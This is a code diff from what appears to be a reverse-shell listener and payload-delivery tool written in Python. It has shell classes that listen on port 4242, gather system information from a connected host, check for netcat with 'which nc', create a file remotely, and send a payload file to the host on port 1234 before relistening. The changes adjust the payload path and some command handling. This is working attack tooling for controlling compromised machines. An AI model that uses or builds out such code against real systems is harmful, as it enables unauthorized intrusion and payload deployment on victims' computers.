@@ -104,7 +104,7 @@ class NetShell(cmd.Cmd):
                 f.write(f"{contents}\n")
 
     def do_run(self, line):
-        self.output = self.server.send_command(line, wt_output=False)
+        self.output = self.server.send_command(line)
         if self.output:
             sys.stdout.write(f"prettify_output(self.output)\n")
 
@@ -153,16 +153,16 @@ class LocalShell(cmd.Cmd):
             host, port = ("0.0.0.0", 4242)
         else:
             host, port = line.strip().split(" ")
-
+        
         sock = listen(host, port, 0)
         sock.sysinfo = SystemInfoGatherer()
-        sock.sysinfo.binaryGatherer(sock)
+        # sock.sysinfo.binaryGatherer(sock)
 
         if not sock: 
             return
 
         # TODO: Make it so that if there 
-        # sock.sysinfo.is_nc = self.sock.send_command("which nc") # This doesnt work
+        sock.sysinfo.is_nc = pretty(sock.send_command("which nc")) # This doesnt work
         if sock.sysinfo.is_nc:
             logging.info(f"Sending payload..")
             sock.client_socket.send(b"touch payload\n")
@@ -171,7 +171,7 @@ class LocalShell(cmd.Cmd):
             # TODO: add a check that confirms that netcat is running if not just skip 
             sock.server_socket.close()
             sock.client_socket.close()
-            send_file(os.path.join(PROJ_DIR, "payload"), host, 1234)
+            send_file(os.path.join(PROJ_DIR, "payloads/payload"), host, 1234)
             logging.info(f"Payload sent. Starting listener..")
             sock = listen(host, port, 1)
             if not sock:
